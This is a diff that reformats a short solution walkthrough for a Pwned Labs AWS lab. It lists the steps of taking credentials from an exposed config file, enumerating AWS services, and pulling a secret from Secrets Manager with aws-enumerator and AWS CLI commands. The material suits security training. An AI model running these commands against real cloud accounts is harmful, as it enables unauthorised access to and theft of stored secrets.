@@ -6,16 +6,22 @@ https://pwnedlabs.io/labs/assume-privileged-role-with-external-id
 
 ## Solution
 
-Web App
-AWS Config file (/config.json)
-S3 credentials (AccessKeyID + secretAccessKey + Region)
-	aws configure
-	aws-enumerator creds
-	aws sts get-caller-identity
-Exposed aws services (Secret manager)
+* Web App
+* AWS Config file (/config.json)
+* S3 credentials (AccessKeyID + secretAccessKey + Region)
+  
+```
+aws configure
+aws-enumerator creds
+aws sts get-caller-identity
+```
+
+* Exposed aws services (Secret manager)
+```
 	aws-enumerator enum -services all
 	aws-enumerator dump -services <service>
-Extract credential of user (ext/cost-optimization)
+```
+* Extract credential of user (ext/cost-optimization)
 	aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
 	aws secretsmanager get-secret-value --secret-id ext/cost-optimization
 AWS CLI Credentials (using cloud shell)
